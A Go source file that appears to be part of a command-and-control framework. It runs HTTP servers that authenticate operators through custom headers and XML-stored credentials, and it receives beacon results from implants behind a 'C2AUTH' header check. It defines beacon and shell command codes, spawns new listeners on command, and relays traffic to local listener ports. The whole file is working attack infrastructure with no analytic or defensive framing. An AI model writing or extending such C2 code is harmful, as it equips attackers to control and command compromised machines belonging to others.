package main

import (
	"encoding/binary"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
)

type User struct {
	Username string `xml:"username"`
	Password string `xml:"password"`
}

const (
	BEACONS   = 0x00000001
	SHELL     = 0x00000002
	NEWBEACON = 0x00000003
	NEWLISTEN = 0x00000004
)

func StartC2(uri string, port uint16, res *[]byte) {
	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
		iamfrom := r.Header.Get("Iamfrom")
		if iamfrom == "C2AUTH" {
			if r.Method == http.MethodPost {
				body, _ := ioutil.ReadAll(r.Body)
				w.WriteHeader(http.StatusOK)
				*res = body
				return
			} else {
				w.WriteHeader(http.StatusForbidden)
				fmt.Println("bad auth")
				return
			}
		} else {
			w.WriteHeader(http.StatusForbidden)
			fmt.Println("bad auth")
			return
		}

	})
	fmt.Println("Server is running on : " + strconv.Itoa(int(port)))
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)

}

func StartClient(uri string, port uint16) {
	config, _ := parseConfig("./Client/config.xml")
	var res []byte // dong tai jie shou 40049
	lis := 0
	go StartC2("c2", port-1, &res)
	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {

		username := r.Header.Get("user-name")
		password := r.Header.Get("pass-word")

		if authenticate(username, password, config) {
			body, _ := ioutil.ReadAll(r.Body)
			if len(body) == 0 {
				w.WriteHeader(http.StatusOK)
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Write(res)
				res = make([]byte, 0)
			} else {
				if Check_Command(body) == NEWLISTEN {
					body = body[4:]
					lisname := string(body[:4])
					port2 := binary.BigEndian.Uint16(body[4:6])
					uri2 := ""
					a := body[6:]
					go StartListener(uri2, port2, lisname, a)
					lis++
				} else if lis == 0 {
					println("lis 00000")
					w.WriteHeader(http.StatusOK)
					w.Header().Set("Content-Type", "application/octet-stream")
					w.Write(res)
					res = make([]byte, 0)
				} else {
					listen_port := binary.BigEndian.Uint16(body[:2])
					body = body[2:]
					Send_Bytes_to(w, body, "http://localhost:"+strconv.Itoa(int(listen_port)), expectedHeaders)
					w.WriteHeader(http.StatusOK)
					w.Header().Set("Content-Type", "application/octet-stream")
					w.Write(res)
					res = make([]byte, 0)
				}

			}

		} else {
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte("Login failed\n"))

		}
	})

	fmt.Println("Server is running on : " + strconv.Itoa(int(port)))
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}

func parseConfig(filename string) (Config, error) {
	var config Config
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return config, err
	}
	err = xml.Unmarshal(data, &config)
	return config, err
}

func authenticate(username, password string, config Config) bool {
	for _, user := range config.Users {
		if user.Username == username && user.Password == password {
			return true
		}
	}
	return false
}

func Check_Command(data []byte) uint32 {
	if len(data) < 4 {
		return 0
	}

	var num uint32
	num = uint32(data[0])<<24 | uint32(data[1])<<16 | uint32(data[2])<<8 | uint32(data[3])

	return num
}
